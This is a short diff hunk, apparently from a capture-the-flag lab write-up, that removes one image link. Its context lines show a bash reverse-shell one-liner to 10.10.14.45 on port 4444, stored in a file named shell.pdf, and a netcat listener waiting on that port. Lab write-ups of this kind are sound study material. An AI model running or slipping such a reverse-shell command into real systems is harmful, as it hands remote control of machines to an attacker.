@@ -168,8 +168,6 @@ $ cat shell.pdf
 bash -i >& /dev/tcp/10.10.14.45/4444 0>&1
 ```
 
-![nocturnal]({{"/assets/images/nocturnal17.png"}})
-
 ```bash
 $ nc -lvnp 4444
 listening on [any] 4444 ...
